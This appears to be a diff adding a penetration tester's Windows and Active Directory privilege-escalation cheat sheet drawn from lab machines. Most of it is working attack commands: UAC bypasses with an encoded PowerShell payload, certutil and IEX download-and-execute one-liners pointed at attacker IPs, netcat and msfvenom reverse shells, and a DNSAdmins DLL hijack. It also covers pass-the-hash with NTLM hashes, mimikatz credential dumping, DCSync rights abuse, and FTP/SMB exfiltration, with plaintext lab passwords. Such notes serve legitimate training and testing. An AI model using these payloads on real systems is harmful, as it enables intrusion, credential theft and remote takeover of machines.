+    SeImpersonatePrivilege           > rotten potato or Juicy potato
+    SeAssignPrimaryPrivilege        > Juicy potato
+    SeTcbPrivilege
+    SeBackupPrivilege
+    SeRestorePrivilege
+    SeCreateTokenPrivilege
+    SeLoadDriverPrivilege
+    SeTakeOwnershipPrivilege
+    SeDebugPrivilege
+https://foxglovesecurity.com/2017/08/25/abusing-token-privileges-for-windows-local-privilege-escalation/
+
+You will most likely be able to do it with a service account.
+
+windows 7 and 2008r2 until 2016 are affected
+
+
+}}} ###
+#{{{ ###High Integrity admin to System
+
+Go from Admin with High context integrity to system
+	.\PsExec64.exe -accepteula -i -s C:\users\admin\Desktop\Shell32.exe  (You will need to bring over Psexec64 and Shell32.exe)
+
+}}} ###
+{{{ ###UAC Bypass
+
+reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System             
+                                                 
+HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
+    ConsentPromptBehaviorAdmin    REG_DWORD    0x5                      
+
+
+Value				Meaning
+
+0x00000000  This option allows the Consent Admin to perform an operation that requires elevation without consent or credentials.
+
+0x00000001  This option prompts the Consent Admin to enter his or her user name and password (or another valid admin) when an operation requires elevation of privilege. This operation occurs on the secure desktop.
+
+0x00000002  This option prompts the administrator in Admin Approval Mode to select either "Permit" or "Deny" an operation that requires elevation of privilege. If the Consent Admin selects Permit, the operation will continue with the highest available privilege. "Prompt for consent" removes the inconvenience of requiring that users enter their name and password to perform a privileged task. This operation occurs on the secure desktop.
+
+0x00000003		This option prompts the Consent Admin to enter his or her user name and password (or that of another valid admin) when an operation requires elevation of privilege.
+
+0x00000004		This prompts the administrator in Admin Approval Mode to select either "Permit" or "Deny" an operation that requires elevation of privilege. If the Consent Admin selects Permit, the operation will continue with the highest available privilege. "Prompt for consent" removes the inconvenience of requiring that users enter their name and password to perform a privileged task.
+
+0x00000005		This option is the default. It is used to prompt the administrator in Admin Approval Mode to select either "Permit" or "Deny" for an operation that requires elevation of privilege for any non-Windows binaries. If the Consent Admin selects Permit, the operation will continue with the highest available privilege. This operation will happen on the secure desktop.<8>
+
+}}} ###
+#{{{ ###Invoke-EventVwrBypass.ps1 (Fileless)
+
+https://github.com/enigma0x3/Misc-PowerShell-Stuff/blob/master/Invoke-EventVwrBypass.ps1
+https://github.com/enigma0x3/Misc-PowerShell-Stuff
+https://ivanitlearning.wordpress.com/2019/07/07/bypassing-default-uac-settings-manually/
+
+. .\Invoke-EventVwrBypass.ps1
+Invoke-EventVwrBypass -Command "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -enc IgBJAHMAIABFAGwAZQB2AGEAdABlAGQAOgAgACQAKAAoAFsAUwBlAGMAdQByAGkAdAB5AC4AUAByAGkAbgBjAGkAcABhAGwALgBXAGkAbgBkAG8AdwBzAFAAcgBpAG4AYwBpAHAAYQBsAF0AWwBTAGUAYwB1AHIAaQB0AHkALgBQAHIAaQBuAGMAaQBwAGEAbAAuAFcAaQBuAGQAbwB3AHMASQBkAGUAbgB0AGkAdAB5AF0AOgA6AEcAZQB0AEMAdQByAHIAZQBuAHQAKAApACkALgBJAHMASQBuAFIAbwBsAGUAKABbAFMAZQBjAHUAcgBpAHQAeQAuAFAAcgBpAG4AYwBpAHAAYQBsAC4AVwBpAG4AZABvAHcAcwBCAHUAaQBsAHQASQBuAFIAbwBsAGUAXQAnAEEAZABtAGkAbgBpAHMAdAByAGEAdABvAHIAJwApACkAIAAtACAAJAAoAEcAZQB0AC0ARABhAHQAZQApACIAIAB8ACAATwB1AHQALQBGAGkAbABlACAAQwA6AFwAVQBBAEMAQgB5AHAAYQBzAHMAVABlAHMAdAAuAHQAeAB0ACAALQBBAHAAcABlAG4AZAA="
+
+}}} ###
+##{{{ ###UACME
+
+certutil -urlcache -split -f "http://192.168.119.132:8080/UACME/akagi.exe"
+certutil -urlcache -split -f "http://192.168.119.132:8080/UACME/ucrtbased.dll"
+certutil -urlcache -split -f "http://192.168.119.132:8080/UACME/vcruntime140d.dll"
+	certutil -urlcache -split -f "http://192.168.119.132:8080/UACME/SOMESHELLCODE.exe"
+
+.\akagi.exe 9 C:\users\administrator\desktop\53_132.exe
+.\akagi.exe 22 C:\users\administrator\desktop\53_132.exe
+.\akagi.exe 23 C:\users\administrator\desktop\53_132.exe
+.\akagi.exe 24 C:\users\administrator\desktop\53_132.exe
+
+}}} ###
+{{{ ###File Movement
+
+#Bitstransfer
+import-module bitstransfer
+start-bitstransfer http://10.10.14.60:8000/yee.txt
+
+#Certutil
+certutil.exe -urlcache -split -f "http://10.11.0.186:8000/MS16-032.ps1"
+
+#Bitsadmin
+bitsadmin /transfer Ms16032Job /download http://10.10.14.60/Invoke-MS16032.ps1 C:\users\kostas\Downloads\Invoke-MS16032.ps1
+
+#PowerShell
+powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('http://10.10.10.10:7000/iw4455.exe', 'C:\windows\temp\iw4455.exe')
+echo IEX(New-Object Net.WebClient).downloadString('http://10.11.0.186:8000/PowerUp.ps1')  | powershell -noprofile -
+C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('http://10.11.0.186/lse.sh','C:\HFS\sac\lse.sh')
+powershell -c Invoke-WebRequest "http://10.10.14.8/nc.exe" -Outfile "C:\temp\nc.exe"
+powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File Sherlock.ps1
+
+#PowerShell in Memory
+powershell.exe -exec Bypass "IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.186/Sherlock.ps1')"
+
+#FTP
+	#On Kali
+	apt-get install python-pyftpdlib
+	python -m pyftpdlib -p 21 -w
+	#On Target
+	echo import ftplib > yeet.txt
+	echo ftp=ftplib.FTP('10.11.0.186') >> yeet.txt                                                          <<<CHANGE IP
+	echo ftp.login('anonymous','x') >> yeet.txt
+	echo ftp.retrbinary('RETR 3232.asp',open('3232.asp','wb').write) >> yeet.txt           <<<REPLACE FILES
+	echo ftp.quit() >> yeet.txt
+
+#FTP one liner
+	c:\python27\python.exe -c "import ftplib;ftp=ftplib.FTP('10.11.0.186');ftp.login('anonymous','x');ftp.retrbinary('RETR 3232.asp',open('3232.asp','wb').write);ftp.quit()"
+
+#FTP Service One Liner
+	#On Kali
+	python3 -m pip install pyftpdlib
+	python3 -m pyftpdlib -p 21
+	#On Target
+	echo open 192.168.119.132>ftp_commands.txt&echo anonymous>>ftp_commands.txt&echo password>>ftp_commands.txt&echo binary>>ftp_commands.txt&echo put 20210616120249_BloodHound.zip>>ftp_commands.txt&echo bye>>ftp_commands.txt&ftp -s:ftp_commands.txt
+
+#SMB
+	#On Kali
+	python3 /usr/share/doc/python3-impacket/examples/smbserver.py tools `pwd`
+	#or
+	python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support tools `pwd`
+	#On Target
+	dir \\192.168.11.5\tools\
+	copy \\192.168.11.5\tools\file.exe .
+	#Possibly needed fixes
+	Get-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol"
+	Enable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol-Client" -All
+	optionalfeatures.exe
+	#Get Files Off Of Windows
+	KALI
+    	smbserver.py YEET 'pwd' -smb2support -username squid -password squidpower
+	Target
+    net use x: \\192.168.119.132\yeet /user:squid squid
+    x:
+	now you can copy things between machines
+	This will also dump you the users hash.
+
+}}} ###
+{{{ ###GotCreds?
+
+   
+
+#for real admin creds over SMB  
+winexe -U jenkins/administrator%S1TjAtJHKsugh9oC4VZl //10.10.10.63 cmd.exe                    
+winexe -U jenkins/administrator //10.10.10.63 cmd.exe       will prompt you for creds  
+  
+#for admin NTLM Hashes over SMB  
+pth-winexe -U jenkins/administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb85756c24235ff238cbe81fe00 //10.10.10.63 cmd.exe       
+pth-winexe -U jenkins/administrator //10.10.10.63 cmd.exe       will prompt you for creds  
+    #Or  
+psexec.py htb/administrator:PASSWORD@10.10.10.161  
+psexec.py htb/administrator@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 -dc-ip 10.10.10.161  
+  
+#for real non-admin creds over SMB  
+smbmap -u prtgadmin -p PrTg@dmin2019 -d netmon -H 10.10.10.125 -x whoami  
+  
+#for real creds over WinRm  
+ruby evil-winrm.rb -i 10.10.10.169 -u melanie -p 'Welcome123!'   
+  
+#for cmdkey /list creds  
+runas /savecred /user:WORKGROUP\Administrator "nc.exe -e cmd.exe 10.10.14.3 3232"  
+  
+#Real creds internal  
+C:\Windows\System32\runas.exe /env /noprofile /user:<username> <password> "c:\users\Public\nc.exe -nc <attacker-ip> 4444 -e cmd.exe"  
+  
+#Real creds internal 2  
+$secpasswd = ConvertTo-SecureString "<password>" -AsPlainText -Force  
+$mycreds = New-Object System.Management.Automation.PSCredential ("<user>", $secpasswd)  
+$computer = "<hostname>"  
+[System.Diagnostics.Process]::Start("C:\users\public\nc.exe","<attacker_ip> 4444 -e cmd.exe", $mycreds.Username, $mycreds.Password, $computer)  
+#https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---runas  
+  
+#Powershell Cred Useage 1  
+$secpass = ConvertTo-SecureString "corporate568" -AsPlainText -Force  
+$cred = New-Object System.Management.Automation.PSCredential("mssql-svc",$secpass)  
+invoke-command -computername localhost -ScriptBlock { whoami } -Credential $cred -InDisconnectedSession  
+  
+#Connect to Share with Creds  
+net use x: \\localhost\c$ /user:admin password123  
+x:
+
+
+
+C:\Windows\System32\runas.exe /env /noprofile /user:administrator "Enable-WindowsOptionalFeature -Online -FeatureName 'SMB1Protocol' -All"
+
+
+
+net use x: \\org1-share\c$ /user:hugh.payne D9M6#3#9pB7@
+copy C:\3232.exe X:\3232.exe
+
+powershell
+$secpass = ConvertTo-SecureString "D9M6#3#9pB7@" -AsPlainText -Force
+$cred = New-Object System.Management.Automation.PSCredential("hugh.payne",$secpass)
+invoke-command -computername org1-file -ScriptBlock { C:\3232.exe } -Credential $cred -InDisconnectedSession
+
+}}} ###
+{{{ ###Extra Stuff
+}}} ###
+#{{{ ###AD Enumeration
+
+net user
+net user /domain
+net user Yeet_admin /domain
+net group /domain
+
+powershell
+##############AdEnum.ps1
+$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain() 
+ 
+$PDC = ($domainObj.PdcRoleOwner).Name 
+ 
+$SearchString = "LDAP://" $SearchString += $PDC + "/" 
+ 
+$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))" 
+ 
+$SearchString += $DistinguishedName 
+ 
+$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString) 
+ 
+$objDomain = New-Object System.DirectoryServices.DirectoryEntry 
+ 
+$Searcher.SearchRoot = $objDomain 
+ 
+$Searcher.filter="samAccountType=805306368" 
+#$Searcher.filter="name=yeeter_skeeter"
+#$Searcher.filter="(objectClass=Group)"
+#$Searcher.filter="serviceprincipalname=*http*"
+ 
+$Result = $Searcher.FindAll() 
+ 
+Foreach($obj in $Result)
+{     
+	Foreach($prop in $obj.Properties)     
+	{         
+		$prop     
+	} 
+} 
+######################
+
+import-module PowerView.ps1
+get-netloggedon -ComputerName yeecompuyee
+get-netsession -ComputerName yeeDC01yee
+
+mimikatz.exe
+privilege::debug
+sekurlsa::logonpasswords
+sekurlsa::tickets
+kerberos::list /export
+
+
+add-type -assemblyname system.identitymodel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'HTTP/CorpWebServer.corp.com' 
+klist
+
+net accounts
+
+}}} ###
+##{{{ ###Bloodhound
+
+neo4j console                             to start neo4j
+bloodhound  --nosandbox            username neo4j      password bloodhound
+
+Move SharpHound (.ps1 or .exe) to the target machine
+
+on target machine
+.\SharpHound.exe -h         < will show you help
+.\SharpHound.exe -c all     < will start collector and create a .zip file with all of the data.
+.\SharpHound.exe --ldapusername svc-alfresco --ldappassword s3rvice -c all
+
+
+move xxx_bloodhoud.zip back onto kali and drop into bloodhound page
+
+}}} ###
+##{{{ ###PowerView
+
+IEX(New-object net.webclient).downloadstring('http://10.10.14.60:8080/PV.ps1')                      <<At the bottom is the link to this old powerview.
+$pass = convertto-securestring ‘YeeYeeYee’ -AsPlainText -Force
+$cred = new-object system.management.automation.pscredential('htb\squid', $pass)
+Add-DomainObjectAcl -credential $cred -targetidentity "DC=htb,DC=local" -PrincipalIdentity squid -rights DCSync
+
+
+VVVVVVVVVOnly Old PowerView is Functional With Bloodhound!!!!!!VVVVVVVVV
+https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/situational_awareness/network/powerview.ps1
+
+}}} ###
+#{{{ ###ADS
+
+dir /r
+    hm.txt:root.txt:$DATA
+more < hm.txt:root.txt:$DATA
+
+powershell (get-content hm.txt -stream root.txt)
+
+dir -force
+
+in smbclient
+    allinfo "filename"          ( in stream you'll be able to see the keyword)
+    get "Filename:keyword"      File ADS has been dumped to the kali box. Cat it and win the war.
+
+https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/
+
+}}} ###
+#{{{ ###Groups
+
+See a wierd group?
+google  
+    DCSync "wierd group name"
+    DCSync azure admins
+
+}}} ###
+##{{{ ###Azure Admins
+
+If you are in the Azure Admins group prepare to be root
+this was also done in moteverde (htb, 172)
+This githpub page has the code you want. view it raw and copy it into a file. If this no longer exists it is in Monteverde
+https://github.com/Hackplayers/PsCabesha-tools/blob/master/Privesc/Azure-ADConnect.ps1
+
+<load .\Azure-ADConnect.ps1 into memory>
+import-module .\Azure-ADConnect.ps1
+<execute>
+Azure-ADConnect -server 10.10.10.172 -db ADSync
+<enjoy your creds>
+
+[+] Domain:  MEGABANK.LOCAL
+[+] Username: administrator
+[+]Password: d0m@in4dminyeah!
+
+}}} ###
+##{{{ ###DNS Admins
+
+whoami /groups
+    dnsadmins
+    
+msfvenom -a x64 -p windows/x64/shell_reverse_tcp LHOST=10.10.14.60 LPORT=3232 -f dll > yee.dll
+nc -nlvp 3232
+sudo bash
+smbserver.py yeet `pwd`
+
+net view \\10.10.14.60
+dnscmd.exe resolute.megabank.local /config /serverlevelplugindll \\10.10.14.60\yeet\yee.dll
+sc.exe stop dns
+sc.exe start dns
+sc.exe query dns
+...enjoy your shell!
+
+https://medium.com/techzap/dns-admin-privesc-in-active-directory-ad-windows-ecc7ed5a21a2
+
+}}} ###
+#{{{ ###Port Forwarding
+
+Explanation:
+	plink.exe requires you to SSH to Kali, and then uses the SSH tunnel to forward ports.
+Useage:
+	plink.exe <kaliuser(root)>@<kaliIP> -R <kaliport>:<target-IP(probably 127.0.0.1)>:<target-port>
+Example:
+	plink.exe root@192.168.11.5 -R 445:127.0.0.1:445 	(hit enter a couple times and you will be kicked out of your shell).
+	winexe -U admin%password123 //127.0.0.1 cmd.exe	(you will be logging in via the target localport 445)
+
+}}} ###
+#{{{ ###RDP
+
+expose internal port:
+	netsh interface portproxy add v4tov4 listenaddress=172.16.2.2 listenport=3389 connectaddress=127.0.0.1 connectport=80
+enable rdp
+	enable-psremoting
+	reg add "hklm\system\currentcontrolset\control\terminal server\fdenytsconnections" /v 0
+	shutdown /r /t 00 /f
+xfreerdp /u:"administrator" /v:my.server.net:61220
+
+}}} ###
+#{{{ ###WSL (Windows Subsystem for Linux)
+
+Giveaway the it exists is often a "Distros" directory (often on the root) or an ubuntu.exe file laying around.
+
+access wsl by finding wither wsl.exe or bash.exe (or a bash.lnk file)
+
+VVTo find bash.exeVV 
+cd C:\windows 
+dir /s /b | findstr bash.exe
+
+once you are in, you can peruse the system with linux commands (in .bash_history i've tended to find good stuff).
+
+}}} ###
+{{{ ###Resources
+[https://github.com/frizb/Windows-Privilege-Escalationhttps://github.com/frizb/Windows-Privilege-Escalation](https://github.com/frizb/Windows-Privilege-Escalationhttps://github.com/frizb/Windows-Privilege-Escalation)  
+[https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)  
+[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)  
+[https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation](https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation)  
+[https://medium.com/@sushantkamble/windows-privilege-escalation-without-metasploit-9bad5fbb5666](https://medium.com/@sushantkamble/windows-privilege-escalation-without-metasploit-9bad5fbb5666)
+}}} ###
